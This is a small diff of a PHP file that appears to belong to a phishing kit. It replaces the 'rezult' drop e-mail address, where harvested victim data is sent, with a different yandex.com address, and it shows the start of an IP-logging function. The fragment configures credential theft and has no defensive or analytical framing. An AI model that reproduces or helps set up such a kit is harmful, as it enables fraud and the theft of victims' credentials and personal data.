@@ -1,5 +1,5 @@
 <?php
-$my_mail = "BenefREZ@yandex.com";   // Votre E-Mail pour recup rezult
+$my_mail = "je4nfontaine@yandex.com";   // Votre E-Mail pour recup rezult
 
 function _ip() {
             $ipaddress = '';
